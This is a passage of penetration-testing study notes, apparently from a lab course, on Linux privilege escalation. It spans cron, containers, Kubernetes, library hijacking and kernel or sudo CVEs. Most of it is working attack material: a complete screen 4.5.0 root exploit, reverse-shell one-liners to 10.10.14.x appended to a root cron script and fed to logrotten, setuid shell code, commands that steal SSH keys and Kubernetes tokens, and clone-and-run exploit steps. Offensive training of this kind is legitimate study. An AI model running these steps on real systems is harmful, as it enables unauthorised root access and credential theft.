uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(mrb3n)
```

> The below script can be used to perform this privilege escalation attack:

### **Screen\_Exploit\_POC.sh**

```bash
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell
```

***

## 2.Cron Job Abuse

> Cron jobs can also be set to run one time (such as on boot). They are typically used for administrative tasks such as running backups, cleaning up directories, etc. The `crontab` command can create a cron file, which will be run by the cron daemon on the schedule specified. When created, the cron file will be created in `/var/spool/cron` for the specific user that creates it. Each entry in the crontab file requires six items in the following order: minutes, hours, days, months, weeks, commands. For example, the entry `0 */12 * * * /home/admin/backup.sh` would run every 12 hours.
>
> The root crontab is almost always only editable by the root user or a user with full sudo privileges; however, it can still be abused. You may find a world-writable script that runs as root and, even if you cannot read the crontab to know the exact schedule, you may be able to ascertain how often it runs (i.e., a backup script that creates a `.tar.gz` file every 12 hours). In this case, you can append a command onto the end of the script (such as a reverse shell one-liner), and it will execute the next time the cron job runs.
>
> Certain applications create cron files in the `/etc/cron.d` directory and may be misconfigured to allow a non-root user to edit them.
>
> First, let's look around the system for any writeable files or directories. The file `backup.sh` in the `/dmz-backups` directory is interesting and seems like it could be running on a cron job.

```shell-session
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

```shell-session
 ls -la /dmz-backups/
```

> We can confirm that a cron job is running using [pspy](https://github.com/DominicBreuker/pspy), a command-line tool used to view running processes without the need for root privileges. We can use it to see commands run by other users, cron jobs, etc. It works by scanning [procfs](https://en.wikipedia.org/wiki/Procfs).
>
> Let's run `pspy` and have a look. The `-pf` flag tells the tool to print commands and file system events and `-i 1000` tells it to scan [procfs](https://man7.org/linux/man-pages/man5/procfs.5.html) every 1000ms (or every second).

```shell-session
./pspy64 -pf -i 1000
```

```shell-session
cat /dmz-backups/backup.sh
```

```
#!/bin/bash
 SRCDIR="/var/www/html"
 DESTDIR="/dmz-backups/"
 FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
 tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
```

> We can see that the script is just taking in a source and destination directory as variables. It then specifies a file name with the current date and time of backup and creates a tarball of the source directory, the web root directory. Let's modify the script to add a [Bash one-liner reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

```bash
#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
 
bash -i >& /dev/tcp/10.10.14.3/443 0>&1
```

```shell-session
nc -lnvp 443
```

***

## 3.Containers

## Linux Containers

### Linux Daemon

```shell-session
id

```

```
cd ContainerImages
```

```shell-session
ls

ubuntu-template.tar.xz
```

```shell-session
lxc image import ubuntu-template.tar.xz --alias ubuntutemp
```

```shell-session
lxc image list
```

> After verifying that this image has been successfully imported, we can initiate the image and configure it by specifying the `security.privileged` flag and the root path for the container. This flag disables all isolation features that allow us to act on the host.

```shell-session
lxc init ubuntutemp privesc -c security.privileged=true
```

```shell-session
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

```shell-session
 lxc start privesc
```

```shell-session
lxc exec privesc /bin/bash
```

```shell-session
ls -l /mnt/root
```

***

## 4.Docker

## Docker Architecture

> At the core of the Docker architecture lies a client-server model, where we have two primary components:
>
> * The Docker daemon
> * The Docker client
>
> The Docker client acts as our interface for issuing commands and interacting with the Docker ecosystem, while the Docker daemon is responsible for executing those commands and managing containers.

### Docker Daemon

The `Docker Daemon`, also known as the Docker server, is a critical part of the Docker platform that plays a pivotal role in container management and orchestration. Think of the Docker Daemon as the powerhouse behind Docker. It has several essential responsibilities like:

* running Docker containers
* interacting with Docker containers
* managing Docker containers on the host system.

```shell-session
 cd /hostsystem/home/cry0l1t3
 ls -l
 cat .ssh/id_rsa
 ssh cry0l1t3@<host IP> -i cry0l1t3.priv
 ls -al
```

{% embed url="<https://master.dockerproject.com/linux/x86_64/docker>" %}

```shell-session
wget https://<parrot-os>:443/docker -O docker
chmod +x docker
ls -l
```

```shell-session
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
htb-student@container:~/app$ /tmp/docker -H unix:///app/docker.sock ps
```

Now, we can log in to the new privileged Docker container with the ID `7ae3bcc818af` and navigate to the `/hostsystem`.

```shell-session
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash
cat /hostsystem/root/.ssh/id_rsa
```

### Docker Group

```shell-session
 id
 docker image ls
```

### Docker Socket

```shell-session
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
ls -l
```

## 5.Kubernetes

### K8s Concept

Kubernetes revolves around the concept of pods, which can hold one or more closely connected containers. Each pod functions as a separate virtual machine on a node, complete with its own IP, hostname, and other details. Kubernetes simplifies the management of multiple containers by offering tools for load balancing, service discovery, storage orchestration, self-healing, and more. Despite challenges in security and management, K8s continues to grow and improve with features like `Role-Based Access Control` (`RBAC`), `Network Policies`, and `Security Contexts`, providing a safer environment for applications.

Differences between K8 and Docker

| **Function** | **Docker**                       | **Kubernetes**                                |
| ------------ | -------------------------------- | --------------------------------------------- |
| `Primary`    | Platform for containerizing Apps | An orchestration tool for managing containers |
| `Scaling`    | Manual scaling with Docker swarm | Automatic scaling                             |
| `Networking` | Single network                   | Complex network with policies                 |
| `Storage`    | Volumes                          | Wide range of storage options                 |

Kubernetes architecture is primarily divided into two types of components:

* `The Control Plane` (master node), which is responsible for controlling the Kubernetes cluster
* `The Worker Nodes` (minions), where the containerized applications are run

### **Nodes**

The master node hosts the Kubernetes `Control Plane`, which manages and coordinates all activities within the cluster and it also ensures that the cluster's desired state is maintained. On the other hand, the `Minions` execute the actual applications and they receive instructions from the Control Plane and ensure the desired state is achieved.

It covers versatility in accommodating various needs, such as supporting databases, AI/ML workloads, and cloud-native microservices. Additionally, it's capable of managing high-resource applications at the edge and is compatible with different platforms. Therefore, it can be utilized on public cloud services like Google Cloud, Azure, and AWS or within private on-premises data centers.

**Control Plane**

The Control Plane serves as the management layer. It consists of several crucial components, including:

| **Service**             | **TCP Ports**  |
| ----------------------- | -------------- |
| `etcd`                  | `2379`, `2380` |
| `API server`            | `6443`         |
| `Scheduler`             | `10251`        |
| `Controller Manager`    | `10252`        |
| `Kubelet API`           | `10250`        |
| `Read-Only Kubelet API` | `10255`        |

## **K8's API Server Interaction**

```shell-session
 curl https://10.129.10.11:6443 -k
```

### **Kubelet API - Extracting Pods**

```shell-session
curl https://10.129.10.11:10250/pods -k | jq .
```

### **Kubeletctl - Extracting Pods**

```shell-session
kubeletctl -i --server 10.129.10.11 pods
```

### **Kubelet API - Available Commands**

```shell-session
kubeletctl -i --server 10.129.10.11 scan rce
```

### **Kubelet API - Executing Commands**

```shell-session
kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx
```

## Privilege Escalation

* <https://github.com/cyberark/kubeletctl>

### **Kubelet API - Extracting Tokens**

```shell-session
kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
```

### **Kubelet API - Extracting Certificates**

```shell-session
kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
```

### **List Privileges**

```shell-session
export token=`cat k8.token`

kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list
```

### **Pod YAML**

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

### Creating a new Pod

```shell-session
 kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml
```

```shell-session
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods
```

### **Extracting Root's SSH Key**

```shell-session
kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
```

## 6.Logrotate

```shell-session
man logrotate
# or
logrotate --help
```

```shell-session
cat /etc/logrotate.conf


# see "man logrotate" for details

# global options do not affect preceding include directives

# rotate log files weekly
weekly

# use the adm group by default, since this is the owning group
# of /var/log/syslog.
su root adm

# keep 4 weeks worth of backlogs
rotate 4

# create new (empty) log files after rotating old ones
create

# use date as a suffix of the rotated file
#dateext

# uncomment this if you want your log files compressed
#compress

# packages drop log rotation information into this directory
include /etc/logrotate.d

# system-specific logs may also be configured here.
```

```shell-session
sudo cat /var/lib/logrotate.status
```

```shell-session
ls /etc/logrotate.d/
```

```shell-session
cat /etc/logrotate.d/dpkg
```

> To exploit `logrotate`, we need some requirements that we have to fulfill.
>
> 1. we need `write` permissions on the log files
> 2. logrotate must run as a privileged user or `root`
> 3. vulnerable versions:
>    * 3.8.6
>    * 3.11.0
>    * 3.15.0
>    * 3.18.0

* <https://github.com/whotwagner/logrotten>

```shell-session
git clone https://github.com/whotwagner/logrotten.git
cd logrotten
gcc logrotten.c -o logrotten
```

```shell-session
echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```

```shell-session
grep "create\|compress" /etc/logrotate.conf | grep -v "#"
```

```shell-session
nc -nlvp 9001

Listening on 0.0.0.0 9001
```

```shell-session
./logrotten -p ./payload /tmp/tmp.log
```

```shell-session
...
Listening on 0.0.0.0 9001

Connection received on 10.129.24.11 49818
# id

uid=0(root) gid=0(root) groups=0(root)
```

## 7.Miscellaneous Techniques

## Passive Traffic Capture

> If `tcpdump` is installed, unprivileged users may be able to capture network traffic, including, in some cases, credentials passed in cleartext. Several tools exist, such as [net-creds](https://github.com/DanMcInerney/net-creds) and [PCredz](https://github.com/lgandx/PCredz) that can be used to examine data being passed on the wire. This may result in capturing sensitive information such as credit card numbers and SNMP community strings. It may also be possible to capture Net-NTLMv2, SMBv2, or Kerberos hashes, which could be subjected to an offline brute force attack to reveal the plaintext password. Cleartext protocols such as HTTP, FTP, POP, IMAP, telnet, or SMTP may contain credentials that could be reused to escalate privileges on the host.

## Weak NFS Privileges

```shell-session
showmount -e 10.129.2.12
```

> When an NFS volume is created, various options can be set:

| Option           | Description                                                                                                                                                                                                                                                                                   |
| ---------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `root_squash`    | If the root user is used to access NFS shares, it will be changed to the `nfsnobody` user, which is an unprivileged account. Any files created and uploaded by the root user will be owned by the `nfsnobody` user, which prevents an attacker from uploading binaries with the SUID bit set. |
| `no_root_squash` | Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set.                                                                           |

```shell-session
 cat /etc/exports
```

```shell-session
 cat shell.c 

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```

```shell-session
gcc shell.c -o shell
```

```shell-session
root@Pwnbox:/tmp$ sudo mount -t nfs 10.129.2.12:/tmp /mnt
root@Pwnbox:/tmp$ cp shell /mnt
root@Pwnbox:/tmp$ chmod u+s /mnt/shell
```

```shell-session
ls -la
```

```shell-session
./shell
id
```

## Hijacking Tmux Sessions

> Terminal multiplexers such as [tmux](https://en.wikipedia.org/wiki/Tmux) can be used to allow multiple terminal sessions to be accessed within a single console session. When not working in a `tmux` window, we can detach from the session, still leaving it active (i.e., running an `nmap` scan). For many reasons, a user may leave a `tmux` process running as a privileged user, such as root set up with weak permissions, and can be hijacked. This may be done with the following commands to create a new shared session and modify the ownership.

```shell-session
htb@NIX02:~$ tmux -S /shareds new -s debugsess
htb@NIX02:~$ chown root:devs /shareds
```

```shell-session
ps aux | grep tmux
```

```shell-session
ls -la /shareds 
```

```shell-session
id
```

```shell-session
tmux -S /shareds
```

# Linux Internals-based Privilege Escalation

## 1.Kernel Exploits

> <https://github.com/dirtycow/dirtycow.github.io>

### Kernel Exploit Example

```shell-session
uname -a
```

```shell-session
 cat /etc/lsb-release 
```

> We can see that we are on Linux Kernel 4.4.0-116 on an Ubuntu 16.04.4 LTS box. A quick Google search for `linux 4.4.0-116-generic exploit` comes up with [this](https://vulners.com/zdt/1337DAY-ID-30003) exploit PoC. Next download it to the system using `wget` or another file transfer method. We can compile the exploit code using [gcc](https://linux.die.net/man/1/gcc) and set the executable bit using `chmod +x`.

```shell-session
gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
```

```shell-session
./kernel_exploit 
```

```shell-session
whoami
```

## 2.Shared Libraries

> It is common for Linux programs to use dynamically linked shared object libraries. Libraries contain compiled code or other data that developers use to avoid having to re-write the same pieces of code across multiple programs. Two types of libraries exist in Linux: `static libraries` (denoted by the .a file extension) and `dynamically linked shared object libraries` (denoted by the .so file extension). When a program is compiled, static libraries become part of the program and can not be altered. However, dynamic libraries can be modified to control the execution of the program that calls them.
>
> There are multiple methods for specifying the location of dynamic libraries, so the system will know where to look for them on program execution. This includes the `-rpath` or `-rpath-link` flags when compiling a program, using the environmental variables `LD_RUN_PATH` or `LD_LIBRARY_PATH`, placing libraries in the `/lib` or `/usr/lib` default directories, or specifying another directory containing the libraries within the `/etc/ld.so.conf` configuration file.
>
> Additionally, the `LD_PRELOAD` environment variable can load a library before executing a binary. The functions from this library are given preference over the default ones. The shared objects required by a binary can be viewed using the `ldd` utility.

```shell-session
ldd /bin/ls
```

## LD\_PRELOAD Privilege Escalation

```shell-session
sudo -l
```

```shell-session
Matching Defaults entries for daniel.carter on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart
```

> This user has rights to restart the Apache service as root, but since this is `NOT` a [GTFOBin](https://gtfobins.github.io/#apache) and the `/etc/sudoers` entry is written specifying the absolute path, this could not be used to escalate privileges under normal circumstances. However, we can exploit the `LD_PRELOAD` issue to run a custom shared library file. Let's compile the following library:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

```shell-session
gcc -fPIC -shared -o root.so root.c -nostartfiles
```

```shell-session
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

## 3.Shared Object Hijacking

```shell-session
ls -la payroll
```

```shell-session
ldd payroll
```

> We see a non-standard library named `libshared.so` listed as a dependency for the binary. As stated earlier, it is possible to load shared libraries from custom locations. One such setting is the `RUNPATH` configuration. Libraries in this folder are given preference over other folders. This can be inspected using the [readelf](https://man7.org/linux/man-pages/man1/readelf.1.html) utility.

```shell-session
readelf -d payroll  | grep PATH
```

> The configuration allows the loading of libraries from the `/development` folder, which is writable by all users. This misconfiguration can be exploited by placing a malicious library in `/development`, which will take precedence over other folders because entries in this file are checked first (before other folders present in the configuration files).

```shell-session
ls -la /development/
```

```shell-session
ldd payroll
```

```shell-session
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
```

```shell-session
./payroll 
```

> We can copy an existing library to the `development` folder. Running `ldd` against the binary lists the library's path as `/development/libshared.`so, which means that it is vulnerable. Executing the binary throws an error stating that it failed to find the function named `dbquery`. We can compile a shared object which includes this function.

```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 
```

> The `dbquery` function sets our user id to 0 (root) and executing `/bin/sh` when called. Compile it using [GCC](https://linux.die.net/man/1/gcc).

```shell-session
gcc src.c -fPIC -shared -o /development/libshared.so
```

```shell-session
./payroll 
```

## 4.Python Library Hijacking

> Python is one of the world's most popular and widely used programming languages and has already replaced many other programming languages in the IT industry. There are very many reasons why Python is so popular among programmers. One of them is that users can work with a vast collection of libraries.
>
> Many libraries are used in Python and are used in many different fields. One of them is [NumPy](https://numpy.org/doc/stable/). `NumPy` is an open-source extension for Python. The module provides precompiled functions for numerical analysis. In particular, it allows easy handling of extensive lists and matrices. However, it offers many other essential features, such as functions of random number generation, Fourier transform, linear algebra, and many others. Furthermore, NumPy provides many mathematical functions for working with arrays and matrices.
>
> Another library is [Pandas](https://pandas.pydata.org/docs/). `Pandas` is a library for data processing and data analysis with Python. It extends Python with data structures and functions for processing data tables. A particular strength of Pandas is time series analysis.&#x20;
>
> Python has [the Python standard library](https://docs.python.org/3/library/), with many modules on board from a standard installation of Python. These modules provide many solutions that would otherwise have to be laboriously worked out by writing our programs. There are countless hours of saved work here if one has an overview of the available modules and their possibilities. The modular system is integrated into this form for performance reasons. If one would automatically have all possibilities immediately available in the basic installation of Python without importing the corresponding module, the speed of all Python programs would suffer greatly.
>
> In Python, we can import modules quite easily:

### Importing Modules

```python
#!/usr/bin/env python3

# Method 1
import pandas

# Method 2
from pandas import *

# Method 3
from pandas import Series
```

> There are many ways in which we can hijack a Python library. Much depends on the script and its contents itself. However, there are three basic vulnerabilities where hijacking can be used:
>
> 1. Wrong write permissions
> 2. Library Path
> 3. PYTHONPATH environment variable

## Wrong Write Permissions

> For example, we can imagine that we are in a developer's host on the company's intranet and that the developer is working with python. So we have a total of three components that are connected. This is the actual python script that imports a python module and the privileges of the script as well as the permissions of the module.
>
> One or another python module may have write permissions set for all users by mistake. This allows the python module to be edited and manipulated so that we can insert commands or functions that will produce the results we want. If `SUID`/`SGID` permissions have been assigned to the Python script that imports this module, our code will automatically be included.
>
> If we look at the set permissions of the `mem_status.py` script, we can see that it has a `SUID` set.

### Python Script

```shell-session
ls -l mem_status.py
```

### Python Script - Contents

> By analyzing the permissions over the `mem_status.py` Python file, we understand that we can execute this script and we also have permission to view the script, and read its contents.

```python
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")
```

### Module Permissions

```shell-session
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
```

```shell-session
 ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

### Module Contents

```python
...SNIP...

def virtual_memory():

	...SNIP...
	
    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```

> This is the part in the library where we can insert our code. It is recommended to put it right at the beginning of the function. There we can insert everything we consider correct and effective. We can import the module `os` for testing purposes, which allows us to execute system commands. With this, we can insert the command `id` and check during the execution of the script if the inserted code is executed.

### Module Contents - Hijacking

```python
...SNIP...

def virtual_memory():

	...SNIP...
	#### Hijacking
	import os
	os.system('id')
	

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP..
```

### Privilege Escalation

```shell-session
sudo /usr/bin/python3 ./mem_status.py
```

## Library Path

### PYTHONPATH Listing

```shell-session
python3 -c 'import sys; print("\n".join(sys.path))'
```

### **Psutil Default Installation Location**

```shell-session
pip3 show psutil
```

### **Misconfigured Directory Permissions**

```shell-session
ls -la /usr/lib/python3.8
```

### Hijacked Module Contents - psutil.py

```python
#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')
```

### **Privilege Escalation via Hijacking Python Library Path**

```shell-session
sudo /usr/bin/python3 mem_status.py
```

## PYTHONPATH Environment Variable

### **Checking sudo permissions**

```shell-session
sudo -l
```

### Privilege Escalation using PYTHONPATH Environment Variable

```shell-session
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
```

<br>

# Recent 0-Days

## 1.Sudo

```shell-session
sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
```

> One of the latest vulnerabilities for `sudo` carries the CVE-2021-3156 and is based on a heap-based buffer overflow vulnerability. This affected the sudo versions:
>
> * 1.8.31 - Ubuntu 20.04
> * 1.8.27 - Debian 10
> * 1.9.2 - Fedora 33
> * and others
>
> To find out the version of `sudo`, the following command is sufficient:

```shell-session
sudo -V | head -n1
```

* <https://github.com/blasty/CVE-2021-3156>

```shell-session
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
```

```shell-session
./sudo-hax-me-a-sandwich
```

```shell-session
cat /etc/lsb-release
```

```shell-session
./sudo-hax-me-a-sandwich 1
```

## Sudo Policy Bypass

* <https://www.sudo.ws/security/advisories/minus_1_uid/>

```shell-session
sudo -l
```

```shell-session
cat /etc/passwd | grep cry0l1t3
```

```
cry0l1t3@nix02:~$ sudo -u#-1 id

root@nix02:/home/cry0l1t3# id
```

## 2.Polkit

> Polkit works with two groups of files.
>
> 1. actions/policies (`/usr/share/polkit-1/actions`)
> 2. rules (`/usr/share/polkit-1/rules.d`)

> Polkit also has `local authority` rules which can be used to set or remove additional permissions for users and groups. Custom rules can be placed in the directory `/etc/polkit-1/localauthority/50-local.d` with the file extension `.pkla`.
>
> PolKit also comes with three additional programs:
>
> * `pkexec` - runs a program with the rights of another user or with root rights
> * `pkaction` - can be used to display actions
> * `pkcheck` - this can be used to check if a process is authorized for a specific action
>
> The most interesting tool for us, in this case, is `pkexec` because it performs the same task as `sudo` and can run a program with the rights of another user or root.

```shell-session
cry0l1t3@nix02:~$ # pkexec -u <user> <command>
cry0l1t3@nix02:~$ pkexec -u root id
```

> In the `pkexec` tool, the memory corruption vulnerability with the identifier [CVE-2021-4034](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034) was found, also known as [Pwnkit](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034) and also leads to privilege escalation. This vulnerability was also hidden for more than ten years, and no one can precisely say when it was discovered and exploited. Finally, in November 2021, this vulnerability was published and fixed two months later.
>
> To exploit this vulnerability, we need to download a [PoC](https://github.com/arthepsy/CVE-2021-4034) and compile it on the target system itself or a copy we have made.

```shell-session
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
gcc cve-2021-4034-poc.c -o poc
```

> Once we have compiled the code, we can execute it without further ado. After the execution, we change from the standard shell (`sh`) to Bash (`bash`) and check the user's IDs.

```shell-session
cry0l1t3@nix02:~$ ./poc

# id
```

## 3.Dirty Pipe

* <https://dirtypipe.cm4all.com/>
* <https://www.cve.org/CVERecord?id=CVE-2022-0847>
* <https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits>

### **Download Dirty Pipe Exploit**

```shell-session
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh
```

### **Verify Kernel Version**

```shell-session
uname -r
```

### Exploitation

```shell-session
./exploit-1

id
```

> With the help of the 2nd exploit version (`exploit-2`), we can execute SUID binaries with root privileges. However, before we can do that, we first need to find these SUID binaries. For this, we can use the following command:

### **Find SUID Binaries**

```shell-session
find / -perm -4000 2>/dev/null
```

> Then we can choose a binary and specify the full path of the binary as an argument for the exploit and execute it.

### Exploitation

```shell-session
./exploit-2 /usr/bin/sudo

# id
```

## 4.Netfilter

> `Netfilter` is a Linux kernel module that provides, among other things, packet filtering, network address translation, and other tools relevant to firewalls. It controls and regulates network traffic by manipulating individual packets based on their characteristics and rules. `Netfilter` is also called the software layer in the Linux kernel. When network packets are received and sent, it initiates the execution of other modules such as packet filters. These modules can then intercept and manipulate packets. This includes the programs like `iptables` and `arptables`, which serve as action mechanisms of the `Netfilter` hook system of the IPv4 and IPv6 protocol stack.
>
> This kernel module has three main functions:
>
> 1. Packet defragmentation
> 2. Connection tracking
> 3. Network address translation (NAT)
>
> When the module is activated, all IP packets are checked by the `Netfilter` before they are forwarded to the target application of the own or remote system. In 2021 ([CVE-2021-22555](https://github.com/google/security-research/tree/master/pocs/linux/cve-2021-22555)), 2022 ([CVE-2022-1015](https://github.com/pqlx/CVE-2022-1015)), and also in 2023 ([CVE-2023-32233](https://github.com/Liuk3r/CVE-2023-32233)), several vulnerabilities were found that could lead to privilege escalation.
>
> Many companies have preconfigured Linux distributions adapted to their software applications or vice versa. This gives the developers and administrators, metaphorically speaking, a "dynamic basis" that is difficult to replace. This would require either adapting the system to the software application or adapting the application to the newer system. Depending on the size and complexity of the application, this can take a great deal of time and effort. This is often why so many companies run older and not updated Linux distributions in production.
>
> Even if the company uses virtual machines or containers like Docker, these are built on a specific kernel. The idea of isolating the software application from the existing host system is a good step, but there are many ways to break out of such a container.

## **CVE-2021-22555**

```shell-session
uname -r
```

```shell-session
wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
gcc -m32 -static exploit.c -o exploit
./exploit
```

## CVE-2022-25636

* <https://nickgregory.me/post/2022/03/12/cve-2022-25636/>

```shell-session
uname -r
```

```shell-session
cry0l1t3@ubuntu:~$ git clone https://github.com/Bonfee/CVE-2022-25636.git
cry0l1t3@ubuntu:~$ cd CVE-2022-25636
cry0l1t3@ubuntu:~$ make
cry0l1t3@ubuntu:~$ ./exploit
```

## CVE-2023-32233

### Proof-Of-Concept

```shell-session
cry0l1t3@ubuntu:~$ git clone https://github.com/Liuk3r/CVE-2023-32233
cry0l1t3@ubuntu:~$ cd CVE-2023-32233
cry0l1t3@ubuntu:~/CVE-2023-32233$ gcc -Wall -o exploit exploit.c -lmnl -lnftnl
```

### Exploitation

```shell-session
cry0l1t3@ubuntu:~/CVE-2023-32233$ ./exploit
```

## 5.Linux Hardening

```shell-session
./lynis audit system
```

